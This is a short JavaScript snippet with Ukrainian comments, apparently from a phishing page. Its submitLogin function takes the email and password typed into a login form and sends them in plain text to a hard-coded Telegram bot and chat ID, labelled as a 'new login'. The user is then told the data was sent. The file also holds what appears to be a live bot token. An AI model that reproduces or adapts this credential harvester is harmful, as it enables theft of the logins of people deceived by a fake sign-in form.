const telegramBotToken = '7587527375:AAGBovyFMetMJQc5Le0iFAZJlyST0AYl-n4'; // Замініть на ваш новий токен бота
const telegramChatId = '7034327346'; // Ваш ID чату

function submitLogin() {
    const form = document.getElementById('Form');
    const email = form.email.value.trim(); // Отримуємо значення email і прибираємо зайві пробіли
    const password = form.password.value.trim(); // Отримуємо значення пароля і прибираємо зайві пробіли

    if (!email || !password) {
        alert('Будь ласка, заповніть обидва поля!');
        return; 
    }

    const message = `
        🔔 Новий вхід:
        ID: ${email}
        Пароль: ${password}
    `;

    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
        }),
    })
    .then((response) => {
        if (response.ok) {
            alert('Дані успішно надіслані!');
            form.reset(); 
        } else {
            alert('Помилка надсилання! Спробуйте ще раз.');
        }
    })
    .catch((error) => {
        alert('Помилка: ' + error.message);
    });
}
